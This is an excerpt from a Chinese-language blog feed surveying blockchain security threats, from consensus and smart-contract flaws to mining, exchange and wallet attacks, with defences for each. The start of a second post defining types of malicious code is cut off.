尽管如此，攻击者还可能存在其他获取“筹码”的途径。为了进一步阻止51%攻击，以太坊提出了一种计划内置于PoS系统客户端的Casper机制。Casper机制要求以太坊的矿工锁定一些以太币作为押金，为刚产生的区块担保。如果投注者是诚实的，他们将获得相应的交易费用作为奖励；否则，Casper将没收大量已投注的以太币作为惩罚。显然，类似Casper机制的保证金奖惩机制可以很好地解决一些社会工程学问题，从而预防趋利节点发起的各种攻击。如：在无利害关系攻击场景中，Casper机制可以惩罚大部分恶意行为，提升了制造恶意分叉的代价使无利害关系攻击无法为攻击者带来收益。若矿工想参与挖矿，则他必须抵押一定数量的以太币作为押金，保证自己在最长链上挖矿。若该区块被确认上链，则矿工收回保证金并获得一定的奖励。如果其他矿工尝试在多条支链上挖矿来进行无利害关系攻击，则会被没收其在多条支链上的押金，这种概念叫做剑手（slasher）协议，即如果矿工在同一个层级的分叉上同时签署了两份承诺，该矿工就会失去区块奖励，甚至被没收押金。</p><p>   在预计算攻击场景中，攻击者可以通过预计算确定下一区块计算难度的关键在于区块生成算法中，上一区块哈希值与下一区块计算难度的关联性 。所以为了预防PoS系统中的预计算攻击，应该重新制定区块生成算法首先，可以考虑打断当前区块链计算难度与前一区块哈希值之间的联系，使得攻击者无法通过预计算控制后续区块的计算难度；其次，也可以考虑增加新的计算元素，使得上一区块的哈希值不再是确定下一区块计算难度的唯一因素。在长距离攻击场景中，区块链网络无法阻止攻击者伪造一条新的区块链主链，但可以通过类似BlockQuick的方式，通过增加身份认证、信誉值对比的方式限制全网节点对该链的接受度来预防长距离攻击。</p><h3 id="合约层攻击类型分析与防御"><a href="#合约层攻击类型分析与防御" class="headerlink" title="合约层攻击类型分析与防御"></a>合约层攻击类型分析与防御</h3><p>   合约层是区块链2.0技术体系的重要标志，封装了区块链的各类脚本代码、算法机制和智能合约，使区块链技术具备了较高的可编程性和实用性。图灵完备的区块链网络允许用户在区块链网络上开发并部署特定的代码或应用，但智能合约在编写过程中存在的诸多不足，可能给区块链网络带来以下安全隐患。</p><p>（1）整数溢出漏洞（integer overflow and underflow vulnerability）： 智能合约代码中，整数型变量都存在上限或下限，当变量存储的数值超过上限则称为整数上溢，超过下限则称为整数下溢。当一个整数变量发生溢出时，可能会从一个很大的数变成很小的数或者从一个很小的数变成很大的数。利用这个漏洞，攻击者通常通过输入异常参数致使整数溢出，从而达到修改地址指针，实现代码异常调用的目的。2010年8月，由于验证机制中存在大整数溢出漏洞，比特币的第74638块出现了一条包含超过1844亿个比特币的交易。2018年4月，BeautyChain（BEC）智能合约中出现了一个灾难性的整数溢出漏洞，导致约10亿美元的损失。</p><p>（2）时间戳依赖攻击（time-stamp dependency attack）： 智能合约的执行大多依赖于当前区块的时间戳，不同的时间戳可能导致智能合约产生不同的执行结果。以抽奖合约为例:假设智能合约需要根据当前时间戳和其他可提前获知变量计算出一个“幸运数”，以确定获奖人员。攻击者则可以在挖矿过程中提前尝试使用不同的时间戳来计算“幸运数”，从而将奖品送给自己想给的获奖者。</p><p>（3）调用深度攻击（call deep attack）： 合约虚拟机在运行过程中会为合约相互调用的深度设置一个阈值，即使合约调用不存在任何逻辑问题，但当调用深度超过该阈值后，合约将不再往下执行，即合约调用失败 。例如在以太坊虚拟机中，调用深度被限制为1024。如果攻击者发起一系列递归调用让栈的深度到达了1023，之后再调用目标智能合约的关键函数，就会自动导致这个函数所有的子调用失败。因此，攻击者可以通过控制调用深度，使得某些关键操作无法执行 。例如在区块链上实现一个拍卖的智能合约，由于拍卖过程中可能存在多次竞价，需要反复调用合约中的出价函数，攻击者可以恶意刷出价次数。当调用深度达到1023次临界值时竞拍结束，此时调用转账函数就会失败，导致拍卖失败。</p><p>（4）误操作异常攻击（misoperation attack）： 攻击者通过智能合约A调用智能合约B时，B可能因为执行异常而返回合约未执行的状态，若A不检查B的结果而继续执行，则将导致A在B未执行的情况下完成调用。 以KoET智能合约为例:网络中各节点可以通过智能合约买卖“以太币国王”称号来获利，支付金额由现任国王来决定。当一个节点想购买“国王”称号时，智能合约A调用智能合约B支付赔偿金给现任国王，并指定该节点成为新的国王。如果B因为操作异常（如调用深度攻击）导致支付失败，而A在未检查B执行结果的情况下继续执行，将导致节点在未支付赔偿金的情况下成为新的“国王”，原“国王”同时失去国王称号和赔偿金。</p><p>（5）重入攻击（re-entrancy attacks）： 攻击者针对智能合约代码的重入漏洞发起的攻击，可导致两个智能合约发生循环调用。其中最具代表性的是DAO攻击：攻击者通过智能合约A向智能合约B发起提现请求，B向A转账并调用A的回调函数。此时，若A的回调函数中被攻击者写入操作“合约A向合约B发起提现请求”。 如此，A再次向B发起提现请求并重复提现过程，直至提现失败（账户余额不足）。2016年6月发生了一起史上最严重的智能合约安全事件——“The DAO”，导致价值6000万美元的以太币被盗，迫使以太币硬分叉为以太坊ETH和以太经典ETC。</p><p>   针对合约虚拟机的攻击。合约虚拟机是智能合约的调用、执行平台，是区块链技术支持多样化应用的载体，提高了区块链的可扩展性，但仍然可能存在一些安全隐患。</p><p>（1）逃逸漏洞（escape vulnerability）： 攻击者在控制一个虚拟机的前提下，通过利用虚拟机和底层监控器（virtual machine monitor，简称VMM）的交互漏洞，实现对底层VMM或其他虚拟机的控制。虚拟机逃逸后可以在VMM层或者管理域中安装后门、执行拒绝服务攻击、窃取其他用户数据，甚至控制其他用户虚拟机等。在区块链系统中，虚拟机在运行代码时会提供一个沙盒环境，一般用户只能在沙盒的限制中执行相应的代码，此类型漏洞会使得攻击者编写的恶意代码在运行该沙盒环境的宿主机上执行，破坏宿主机与沙盒的隔离性。</p><p>（2）逻辑漏洞（logic vulnerability）：逻辑漏洞是指由于程序逻辑不严谨，导致逻辑分支被非正常处理或错误处理的漏洞。虚拟机在发现代码不符合规范时，可能会做一些“容错处理”，并导致一些逻辑问题。最典型的是“以太坊短地址攻击”[97]:在ERC-20 TOKEN标准[98]下，攻击者可以输入一个短地址并调用Transfer方法提币。EVM虚拟机在解析合约代码时，会通过末尾填充0的方式将短地址补至预期长度。此时，参数编码可能出现逻辑漏洞，导致攻击者获取与交易金额不符的代币。</p><p>（3）资源滥用漏洞（resource-exhaustion vulnerability）：攻击者在虚拟机上部署恶意代码，恶意消耗系统存储资源和计算资源。所以在虚拟机中必须要有相应的限制机制来防止系统的资源被滥用。在以太坊中，智能合约采用了gas机制，攻击者想在以太坊虚拟机上做更多操作，需要付出经济代价。</p><p>   合约层攻击的共性在于，攻击者是尝试通过干扰合约的正常调用来实现不同的攻击目的。其特性在于不同攻击方式的攻击目标和原理不同，攻击者可以利用智能合约的代码漏洞或合约虚拟机的运行漏洞，尝试通过非正常的合约调用，以实现非法获利、破坏区块链网络的目的。</p><p>   智能合约实质上是由开发者编写并部署在区块链上的一段代码，其中的漏洞可能是由于开发人员编写的代码不符合标准导致的，如整数溢出漏洞、时间戳依赖性、调用深度限制等；也可能是攻击者（开发者）恶意植入的，如重入攻击。所以在智能合约编写过程中，开发人员需考虑到以下几方面。</p><p>（1）养成良好的编程习惯，以严谨的编程逻辑避免智能合约开发过程中出现整数溢出等常见的漏洞。</p><p>（2）针对智能合约的时间戳依赖性，在合约开发过程中应采用多维参数输入、随机参数输入等，避免合约执行结果完全依赖于时间戳，降低合约执行结果的可预测性。</p><p>（3）针对智能合约的调用深度限制，应在智能合约中预先设置预警惩罚机制。当合约调用次数接近上限时，智能合约调用预警合约对用户发出提醒，若用户继续调用合约最终导致合约运行失败，则预警合约调用惩罚合约对最后调用合约的用户进行惩罚。</p><p>（4）针对重入漏洞，应在合约开发过程中设置参数检验机制。当智能合约A调用智能合约B时，应对B返回的参数进行确认，再继续执行。参数检验机制可以阻止攻击者通过在B植入漏洞发起重入攻击，也可以阻止攻击者实施误操作异常攻击。</p><p>   尽管良好的编程习惯和编程策略可以在一定程度上避免智能合约中出现安全漏洞，但仍有一些安全漏洞是不可避免的。所以在部署智能合约时，用户可以采用以下方法避免代码漏洞带来的危害。</p><p> （1）安全评估:在正式部署智能合约前，应对其进行大量安全测试或白盒审计，以评估该合约的安全性。</p><p> （2）采用Sereum，ZEUS等重入攻击防护工具。其中，Sereum支持多种重入攻击的识别，不仅适用于待部署合约，还可以保护已部署智能合约在重入攻击下的安全性，误报率仅为0.06%。</p><p>   此外，合约虚拟机中存在的逃逸漏洞、逻辑漏洞、资源滥用漏洞可能会导致智能合约的异常运行，攻击者可以在发现这些漏洞后，在与其他用户订立智能合约时，利用这些漏洞编写有利于自己的智能合约代码，使得智能合约失去公平性。所以，区块链网络在引入智能合约虚拟机时，应对虚拟机进行系统的代码审计，分析评估其安全性，并将其可能存在的安全漏洞披露出来。而用户在部署智能合约时，除了对合约代码进行常规审计外，也要根据目标合约虚拟机披露的漏洞对代码进行审计，做好双向的智能合约运行环境评估。</p><h3 id="应用层攻击类型分析与防御"><a href="#应用层攻击类型分析与防御" class="headerlink" title="应用层攻击类型分析与防御"></a>应用层攻击类型分析与防御</h3><p>   应用层是区块链技术的应用载体，为各种业务场景提供解决方案。应用层主要有挖矿机制和区块链交易中存在的安全漏洞和恶意攻击。</p><p>   挖矿场景中的攻击 。 “挖矿”是维持PoW系统正常运转的动力，很多攻击者尝试利用挖矿过程中存在的漏洞获利，这会导致严重的资源浪费，进而降低区块链网络的吞吐量。其中，主要包括针对矿机系统和挖矿机制的恶意攻击。</p><p>   针对矿机系统的攻击 。由于系统代码的闭源特性，用户无法检查矿机的安全性，所以存在诸多安全隐患。</p><p> （1） 0day漏洞攻击（zero-day （0day） vulnerability）：目前，大多数矿机的系统都是通用的，一旦某个矿机系统被发现存在0day漏洞，攻击者可以利用该漏洞得到系统控制权限。</p><p> （2）网络渗透攻击（network penetration attack）：攻击者通过利用多种安全漏洞对客户端系统（如钱包客户端、矿机系统、Web服务系统等）进行持续性渗透，最终获取系统的控制权限，威胁矿机的系统安全。该攻击方式不限制于某一特定漏洞，最终以获取系统权限为目的。</p><p> （3）地址篡改攻击（address tampering attack）：攻击者在攻陷矿机系统之后，通过篡改挖矿奖励接收地址的方式，劫持并盗取原属于目标矿工的挖矿奖励。</p><h4 id="资源浪费"><a href="#资源浪费" class="headerlink" title="资源浪费"></a>资源浪费</h4><p>   在挖矿过程中，“聪明”的矿工可能利用挖矿机制的一些漏洞做出趋利行为，导致严重的资源浪费。主要包括:</p><p>（1）算力伪造攻击（computational forgery attack）：在比特币系统中，矿池一般通过特定的工作量证明检验算法来检验当前矿工的实际算力。如果算法存在某些漏洞时，“聪明”的矿工可能通过虚报算力来获取更高的奖励，这将严重影响奖励分配的公平性，导致矿池的算力流失。</p><p>（2）扣块攻击（block withholding attack）：也被称为藏块攻击。主要有3种形式：第1种是矿池下发计算任务后，恶意矿工直接返回一个错误的计算值，然后分得矿池根据算力分发的数字货币奖励；第2种是矿工挖出区块后，不向矿池返回，而是私自广播至整个网络，独自获得相应的区块奖励；第3种是恶意矿工不会发布自己挖到的区块，导致矿池收益降低。扣块攻击成本较高，恶意矿工获利较少，甚至不获利，所以该攻击常见于矿池恶意竞争的场景中：恶意矿工作为“间谍”加入敌方矿池，在领取敌方矿池奖励的同时，通过浪费敌方矿池的算力资源来获取己方矿池的报酬，实现两方获利。扣块攻击的出现，激化了矿池间的恶意竞争，严重扰乱了正常的挖矿秩序。</p><p>（3）丢弃攻击（drop attack）： 攻击者将多个具有良好网络连接的节点置于网络中，这样不但可以方便地获知最新被广播出的区块，也可以比其他节点更加快速地传播目标区块。当攻击者挖出新区块后不会及时公布，直至得知有区块被公布时，攻击者会立即发布自己的区块，并且利用布置好的节点快速地广播到整个网络，使得该合法节点开采的区块被丢弃，从而获取奖励。</p><p>（4）空块攻击（empty block attack）： 空块攻击是早期比特币网络中常见的攻击方式，<strong>攻击者通过生成空块获取比打包交易区块更快的出块速度，</strong> 从而以更大的可能性获取出块奖励。空块的产生，<strong>意味着比特币网络有10分钟处于拒绝服务的状态</strong> 。偶尔出现空块不会对网络产生太大影响，但短期内出现大量空块，会使交易池中的交易大量滞留，平均交易时间延长。</p><p>（5）通用挖矿攻击（general mining attack）：通用挖矿攻击常见于区块链系统初始化建立的阶段，当该系统与某个已成熟区块链系统采用相同的架构和共识机制时，后者系统中具备大量算力的攻击者可能加入新区块链进行挖矿，以恶意竞争出块奖励。此时容易产生算力集中化问题，甚至当攻击者算力超过新系统全网一半时，可能发起51%攻击来实现代币双花、历史修复、卖空攻击等攻击目的。</p><p>（6）交易顺序依赖攻击（transaction-ordering dependence attack）：区块链交易场景中，交易的处理顺序不同，则其产生的结果也不相同。例如：当攻击者发布一个奖励丰富的解题智能合约时，攻击者可以监听网络中与之相关的解题交易，并在目标解题交易被验证、打包上链前，发布一个具备高Gas值的交易，将解题合约的奖励降低为0。出于最大获利的目的，矿工会优先将高Gas值的交易打包上链，导致解题者无法获得智能合约中原先声明的奖励。</p><p>（7）芬尼攻击（Finney attack）： 芬尼攻击是扣块攻击的一种衍生攻击，主要发生在支持零确认交易的服务场景中，可以作为实现双花攻击的跳板。以比特币系统为例，每笔交易被打包后需要经过6个区块的确认才能真正上链，这明显无法满足部分服务场景对即时性交易的需求，所以部分商家推出零确认交易服务，即用户在完成交易后无需等待确认便可获取服务，商家则需等待交易数据上链才可以获得相应的费用。攻击者可以利用零确认交易的缺点，实施芬尼攻击：当攻击者挖到包含自己交易A的区块时扣留该区块，然后就A对应的代币与商家完成零确认交易B，并在B被确认前将包含A的区块广播至全网。此时，交易B被验证为不合法，攻击者由此实现了双花攻击。 与通过51%攻击实现的双花攻击相比，芬尼攻击的攻击成本远低于基于51%攻击的双花攻击，因此相对常见。</p><p>（8）种族攻击（race attack）： 种族攻击可以看作是一种进阶版的芬尼攻击，可以通过扰乱正常的交易顺序来实现双花攻击。与交易顺序依赖攻击不同的是：交易顺序依赖攻击针对的是智能合约，而种族攻击针对的是支持零确认交易的服务场景。如以太坊中，攻击者在与商家完成零确认交易A后，就A对应的代币生成一个高Gas值的交易B，“聪明”的矿工会优先将B打包进区块以获取最大化的利益，导致零确认交易A验证失败，而攻击者已经提前获取了相应服务，实现了代币双花。</p><h3 id="针对交易平台的攻击"><a href="#针对交易平台的攻击" class="headerlink" title="针对交易平台的攻击"></a>针对交易平台的攻击</h3><p>   随着部分国家对比特币的认可，出现了很多区块链数字货币、交易平台，形成了一套相对完整的区块链电子货币金融体系。用户节点可以通过交易平台进行资产转换、投资等商业行为，也可以通过钱包账户进行点对点的可信交易。多样的交易平台和用户账户中存在的安全漏洞，严重威胁着区块链用户的资产安全。</p><p>   交易平台是区块链电子货币金融体系中十分重要的一类实体，为区块链用户提供了进行各种商业行为的场所。但由于用户的安全意识不足、系统潜在的安全漏洞等原因，交易平台面临隐私泄露、资产流失的风险。</p><p> （1）弱口令攻击（weak password attack）：实际中，用户可能出于方便记忆等原因，为自己的账户设置了安全级别较低的密码，攻击者通过简单的猜测、穷举等方式，即可获取用户的账户访问权限。</p><p> （2）撞库攻击（credential stuffing attack）：用户由于安全意识不足，可能在不同的网站使用相同的账号和口令。攻击者可以通过钓鱼攻击等手段收集与区块链、金融等相关网站上的用户账号和口令，然后在目标交易平台上使用自动化程序逐个尝试，以获取该平台中用户的账户隐私信息。</p><p> （3）穷举攻击（brute-force attack）：如果网站不对登陆接口做请求限制或者风险控制 ，攻击者可以针对目标值发送多次测试请求，尝试通过穷举攻击破解某些关键信息。如在短信验证中，若平台不对短信验证码的<strong>有效期或验证接口</strong>进行限制， 攻击者可以轻易对其完成破解。若平台对<strong>登陆接口未做请求限制</strong> ，攻击者可以通过大量的密码字典来暴力破解某个账户的密码。</p><p> （4） API接口攻击（application programming interface，简称API attack）：用户通常使用私钥key，通过交易平台中私有的API接口来执行一些敏感操作，如交易所新订单的确认、取消等。一旦API key泄露，很可能导致用户账户蒙受经济损失。2018年3月，币安网大量用户API key泄露，攻击者通过泄露的key直接操作用户交易，致一万余枚的比特币被用于购买其他币种，造成币市动荡。</p><p> （5）单点登陆漏洞（single sign-on vulnerability）：攻击者可以通过跨站请求伪造、跨站脚本攻击等手段来窃取用户登陆的Ticket，从而盗取目标用户账户中的资金。2017年10月，OKCoin旗下交易所出现大量账户被盗情况，损失金额超过1千万人民币。</p><h3 id="针对用户账户的攻击"><a href="#针对用户账户的攻击" class="headerlink" title="针对用户账户的攻击"></a>针对用户账户的攻击</h3><p>   区块链钱包、交易所账户是用户参与区块链交易的重要工具，保管着大量的用户隐私和资产，是攻击者的主要攻击目标。由于服务场景的多样性和复杂性，用户账户主要面临以下安全威胁。</p><p>（1）钓鱼攻击（phishing attack）： 攻击者通过伪造网页、系统、邮件等形式，诱导用户进行一系列交易操作，获取用户的钱包、交易所账户口令，进而盗取用户资产。</p><p>（2）木马劫持攻击（Trojan horse attack） ：攻击者可以向用户主机中植入木马病毒，通过按键记录、hook浏览器的方式来获取其账户和口令，从而盗取目标用户资产。2017年8月，攻击者利用木马病毒Trickbot对包括Coinbase在内的几家数字货币交易所进行了Web注入攻击[113]，当受害者购买数字货币时，木马病毒会劫持交易所钱包，并将资金定向至攻击者钱包，最终造成用户损失。</p><p>（3）中间人劫持攻击（man-in-the-middle attack）： 目前，多数交易所都采用HTTPS协议进行交互，在一定程度上保证了数据安全。但在某些API接口的子域名，却未使用HTTPS。攻击者可以通过在流量中转处劫持网络流量，如路由器、网关等流量出口，从而获取相关信息。</p><p>（4）私钥窃取攻击（private key stealing attack）： 用户丢失私钥意味着用户的账户资产全部遗失，因此，用户通常会对钱包的私钥文件进行多次备份，而不安全的备份存放点存在私钥泄露的风险。目前，针对比特币的wallet.dat文件广泛出现在互联网中，例如GitHub、NAS服务器、Web服务等互联网可接入的位置。目前，已经有攻击者开始扫描密钥文件，甚至开发相关的木马病毒进行私钥窃取。</p><p>（5）钱包客户端漏洞（wallet client vulnerability）: 攻击者可能利用钱包软件自身的漏洞实施攻击，进而获取用户隐私和资产。例如：在以太坊多重签名钱包Parity中，攻击者可以通过间接调用初始化钱包软件的库函数，将自己更换为受害者钱包的新主人。2017年11月，Parity钱包出现重大Bug，攻击者利用该Bug成为库的主人，然后调用自杀函数报废整个合约库，彻底冻结了150多个地址中总计超过50万个ETH，直接导致上亿美元资金被冻结。</p><p>（6）粉尘攻击（dusting attack）： 比特币系统中，“聪”是最小的BTC单位，通常将100聪以内的BTC称为粉尘。而且比特币中没有余额的概念，所有合法的交易都可以追溯到前向一个或多个交易的输出，其源头都是挖矿奖励，末尾则是当前未花费的交易输出（unspent transaction output，简称UTXO）。攻击者可以通过向目标用户钱包地址发送“粉尘”来实施粉尘攻击，当用户使用这些“粉尘”交易时，会导致其与用户自有UTXO的交易输出发生混合，攻击者可以通过“粉尘”来追踪用户的钱包地址，获取用户的隐私信息，从而勒索、盗取目标用户的资产。</p><p>（7） SIM hack： 在一些去中心化钱包中，用户需要通过SIM（subscriber identity module）卡来验证身份的合法性。用户通常在丢失SIM卡后向运营商申请“移植”SIM卡，该服务允许客户将该电话号码转移到新的SIM设备中。攻击者可以利用这一漏洞，<strong>通过技术手段将受害者的<strong><strong>SIM</strong></strong>卡移植到他们控制的电话上，然后在其电子邮件帐户上启动密码重置流程，验证码会发送到电话号码中。</strong> 由于攻击者此时控制着SIM卡，可以轻易地对受害者账户信息进行篡改，盗取受害者账户中的财产。</p><p>（8）在线钱包窃取（online wallet theft）：目前，很多用户会选择使用在线钱包，这使得个人的资产安全严重依赖于服务商的安全性。2013年11月，比特币在线钱包服务商Inputs.io遭受黑客攻击，黑客通过电子邮件账号进行入侵，进而劫持代管账号，从中盗取了4 100个比特币。</p><p>（9）重放攻击（replay attack）:主要包含单链重放攻击和多链重放攻击。单链重放攻击中，攻击者通常在以太坊等账户余额模型的区块链系统中先发起一笔交易A（如交易所提现），然后对A的时间戳等数据进行修改，获得新的交易B并进行广播。因为B的私钥签名和公钥加密齐全，所以矿工会在付款方余额足够的情况下将交易B打包进新区块。攻击者不断重复便可获取大量资金，直至付款方账户余额不足为止。多链重放攻击通常出现在区块链硬分叉时，此时用户的地址和私钥生成算法相同，所有“一条链上的交易在另一条链上也往往是合法的”，所以攻击者在其中一条链上发起的交易后，可以重新将该交易广播到另一条链上，并得到整个系统的确认。</p><h3 id="防御策略与方法"><a href="#防御策略与方法" class="headerlink" title="防御策略与方法"></a>防御策略与方法</h3><p>   相比区块链其他层级，应用层攻击的场景更加具体、复杂，所以攻击者的手段也十分多样。因此，区块链应用层面临的安全问题应从实际的服务场景出发，设计合适的防御策略和相关技术。在挖矿场景中，攻击者采用的攻击方式大多具备社会工程学攻击特性，即攻击者会根据矿机漏洞、挖矿机制漏洞采取趋利的挖矿行为，通过损害矿池或其他矿工利益，实现自身利益的最大化。</p><p> 针对矿机的系统漏洞 ，可以尝试以下防御策略。</p><p> （1）开发阶段:开发人员应在开发阶段设定软件安全开发生命周期，建立安全漏洞管理机制，在成品销售前对矿机系统进行代码审计、性能测试，以预防0day漏洞攻击。</p><p> （2）部署阶段:矿工应该在原有的软件防护基础上增加辅助的安全检测技术，如入侵检测、防火墙、蜜罐技术等，进一步预防网络渗透攻击和地址篡改攻击。</p><p>   攻击者可以利用挖矿机制 中存在的漏洞恶意骗取、竞争出块奖励，也可以通过扰乱交易顺序实现双花攻击等。其中，算力伪造攻击和扣块攻击 属于恶意骗取矿池出块奖励的攻击行为，可以尝试以下防御策略。</p><p> （1）身份管理机制:矿池应结合保证金奖惩机制（如Casper机制）和身份认证机制，对新加入的矿工进行身份认证，要求其缴纳一定的保证金，为其诚实的挖矿行为做保证。</p><p> （2）细粒度的工作量检验算法:矿池应定时更新其使用的工作量检验算法，对以往算法中存在的问题进行背书，作为新算法设计的重要依据。</p><p> （3）合理的绩效制度:矿池应定时对矿工进行绩效考核，奖励表现优秀的矿工，驱逐效率低下的懒惰矿工。对矿池内的矿工行为进行管理和约束，保证矿池公平有序地运行。</p><p> （4）相互监管制度:设置矿工相互监管奖励，一旦矿工因进行算力伪造攻击和扣块攻击而被举报，则矿池奖励举报者，没收恶意矿工的保证金，将其加入黑名单后驱逐出矿池，不再录用。</p><p>   丢弃攻击、空块攻击、通用挖矿攻击则属于恶意竞争出块奖励攻击行为。丢弃攻击中，攻击者主要依赖于网络资源优势，可以比其他节点更快获取数据上链信息，也可以更快地完成数据打包上链。所以丢弃攻击可以看作是女巫攻击的变种攻击，也可以作为自私挖矿攻击的前置攻击，提高攻击者实施自私挖矿攻击的成功率。为了防止丢弃攻击，区块链网络可以引入身份认证机制，对用户潜在的节点身份进行关联分析，杜绝单个用户通过操纵多个节点获取远高于其他节点的网络优势。在空块攻击场景中，攻击者之所以可以通过生成空块恶意竞争奖励，是因为区块链网络不存在对新区块的有效性验证过程。因此，区块链网络节点只要在获取新区块时执行有效性验证，即可有效缓解阻止空块攻击。通用挖矿攻击则需要特定的场景才可以实施，其关键在于攻击者利用新系统与旧系统之间相同的架构和共识机制导致的矿机（算力）通用问题，通过成熟系统的中算力对新系统实现算力压制，从而恶意竞争出块奖励，甚至实施双花攻击、卖空攻击等恶意行为。因此，新区块链项目必须考虑系统封闭性、专机专用等问题，从根本上杜绝算力通用导致的通用挖矿攻击。</p><p>   芬尼攻击、种族攻击、交易顺序依赖攻击属于扰乱交易顺序类的攻击方式。芬尼攻击和种族攻击主要针对的是支持零确认交易的服务场景，前者主要利用挖矿便利，攻击者只有在挖到包含自己交易的区块时，才会通过零确认交易扰乱交易秩序，实现代币双花等目的；而后者和交易顺序依赖攻击则是通过提高交易Gas的方式扰乱交易顺序，进而实现代币双花等目的。这两者的共性在于区块链节点在接受新区块时未验证区块内交易与交易池中的未确认交易是否存在冲突。由于零确认交易可以满足商家的即时性支付需求，所以直接通过禁止零确认交易来阻止芬尼攻击和种族攻击的方式不具备可行性。区块链系统可以考虑开通钱包的子账户来保证零确认交易的安全性，即，用户需要通过专门的子账户才能完成零确认交易操作。此时，零确认交易由矿工单独打包验证，在一定程度上可以避免零确认交易与普通交易的冲突。此外，为了避免攻击者扰乱交易顺序，区块链系统可以要求矿工在打包交易时，通过代币锁定技术缴纳保证金之后再广播新区块。其他节点在接受新区块时，可以就区块内交易在交易池中进行遍历验证：如果通过验证，则接受新区块；否则，该节点可以通过举报矿工恶意行为来获取矿工被锁定的保证金及出块奖励。</p><p>•      八、防御策略与方法</p><p>   在区块链交易场景中，攻击者的最终目的是通过直接或间接手段获取用户节点的账户信息，进而盗取资产，主要存在交易平台和用户账户两个攻击目标 。为了保证交易平台中用户的账户隐私，交易平台应采取以下措施。</p><p>（1）引入密码安全等级分析机制。系统可以在用户设置账户密码时，对当前密码的安全性进行实时评级，避免用户使用弱口令，从而预防弱口令攻击。</p><p>（2）交易平台应在用户登录账号时进行人机识别，在一定程度上缓解撞库攻击。而用户也应该注意避免多网站的密码通用问题，可以考虑对账户进行安全等级评估，相同安全等级的账户采用相同的密码，这样既可以缓解撞库攻击，也能避免账户密码过多给用户带来的密码管理问题。</p><p>（3）通过限制目标账户的登陆频率和限制单节点的访问请求频率，从被访问端和访问端两个方向限制攻击者的攻击能力，可以有效预防穷举攻击。</p><p>（4）启用API调用接口认证机制，合理管理交易平台的API接口，预防API接口攻击。</p><p>（5）提高开发工程师安全素养，在一些敏感系统里单独实现一些额外的认证机制，避免单点登陆漏洞。</p><p>   此外，用户在日常交易中应该提高个人的安全意识，采取相应的安全措施，避免在交易过程中泄露了个人账户的隐私数据，具体需要从以下几方面考虑。</p><p>（1）培养好安全意识，提高对危险网站、邮件的辨识能力，预防钓鱼攻击。</p><p>（2）构建全面的系统安全防护体系，安装防火墙等安全软件，预防木马劫持攻击。</p><p>（3）利用安全的路由协议对区块链网络实现全方位覆盖，预防中间人劫持攻击。</p><p>（4）实现离线的密钥管理，预防攻击者对在线密钥存储中的私钥窃取。</p><p>（5）利用代码审计、逆向漏洞分析、反逆向工程等技术对钱包客户端代码的安全性进行评估。</p><p>（6）在使用数字货币钱包时，对一些来源不明的小额资金“粉尘”进行标记并禁用，预防粉尘攻击。</p><p>（7）使用专门的零钱包存储该用户持有的“粉尘”级资产，其中既包含攻击者发送的“粉尘”，也可能包含用户自身交易产生的小额资金。为了资产安全，该零钱包中的资金专用于隐私性不高的交易。</p><p>•      八、防御策略与方法</p><p>   在针对认证机制漏洞的SIM hack攻击场景中，攻击者主要是利用服务商提供的“账户找回”服务中的安全隐患来成功获取目标账户。因为基于手机、邮件的二次验证并不是完全安全的方法，因此服务商应尝试使用采取2FA等具备更高安全性的有更高级别安全设置的服务。2FA是基于时间、历史长度、实物，例如信用卡、SMS手机、令牌、指纹等自然变量结合一定的加密算法组合出的一组动态密码，一般每60s刷新一次。这种方法不容易被破解，相对较安全。</p><p>•      八、防御策略与方法</p><p>   理论上，基于UTXO结构的区块链系统可以抵抗重放攻击，因为转账是基于每一笔UTXO进行的原子级别操作，不存在一笔UTXO被重复扣除的情况。但是在类似以太坊的账户结构中，交易是通过余额判断合法性的只要余额足够就可以进行重复扣款转账，一笔交易的信息进行多次广播的重放攻击是可行的。交易延展性攻击和重放攻击非常相似，它们都是对交易所发起的攻击方式，但重放攻击主要针对区块链硬分叉的情况，而交易延展性攻击讲究的是区块标识的可变性。</p><p>•      八、防御策略与方法</p><p>   此外，基于Hyperledger Fabric的区块链也可以抵抗重放攻击，该框架中采用Endorser节点对客户端提交的交易预案进行身份验证，若交易信息异常，则系统终止操作，这种方式可以有效阻止重放攻击。以太坊的账户结构中存在一个参数Nonce，该参数的值等于从这个账户中发出交易的数量。当交易完成验证后，发送者账户中的Nonce值会自动增加1。当矿工验证一笔交易是否合法的时候，矿工会对比交易包含的Nonce值，并与该交易的发送者账户中的Nonce值进行比较，相等才算作合法交易，并对该交易打包出块。单链重放攻击无法修改发送者账户的数值，因此当接受到重复交易时，矿工会直接判定它无效，从而阻止了单链重放攻击。面对多链重放攻击时可以参考以太零开发团队的做法，建立一个交易锁。当一笔交易发起时，交易锁将被广播到整个区块链网络。此时，交易锁会锁定交易关联的数字资产。交易在主节点验证期间，原交易资产被锁定无法使用，以此达到抵御多链重放攻击的目的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础三</title>
      <link href="/2024/11/26/%E9%93%BE%E5%AE%893/"/>
      <url>/2024/11/26/%E9%93%BE%E5%AE%893/</url>
      
        <content type="html"><![CDATA[<h2 id="七-恶意代码及防范技术与漏洞挖掘技术"><a href="#七-恶意代码及防范技术与漏洞挖掘技术" class="headerlink" title="七.恶意代码及防范技术与漏洞挖掘技术"></a>七.恶意代码及防范技术与漏洞挖掘技术</h2><h3 id="7-1-恶意代码的概念"><a href="#7-1-恶意代码的概念" class="headerlink" title="7.1 恶意代码的概念"></a>7.1 恶意代码的概念</h3><h4 id="7-1-1常见名词举例"><a href="#7-1-1常见名词举例" class="headerlink" title="7.1.1常见名词举例"></a>7.1.1常见名词举例</h4><p><strong>计算机病毒</strong>：</p><p>是一种计算机程序代码，它递归地复制自己或其演化体。病毒感染宿主文件或者某个系统区域，或者仅仅是修改这些对象的引用，来获得控制权并不断地繁殖来产生新的病毒体</p><p><strong>蠕虫病毒</strong>：</p><p> 主要在网络上进行复制</p><p><strong>逻辑炸弹</strong>：</p><p> 通常是合法的应用程序，在编程时写入一些“恶意功能”</p><p><strong>特洛伊木马：</strong></p><p> 隐藏在一个合法的躯壳下的恶意代码</p><p><strong>漏洞利用</strong>：</p><p> 漏洞利用代码（exploit code）针对某一特定  漏洞或一组漏洞</p><p><strong>下载器</strong>：</p><p> 通过破坏杀毒软件，然后再从指定的地址下载大量其他病毒、木马进入用户电脑</p><p><strong>玩笑程序</strong></p><h4 id="7-1-2恶意代码的危害"><a href="#7-1-2恶意代码的危害" class="headerlink" 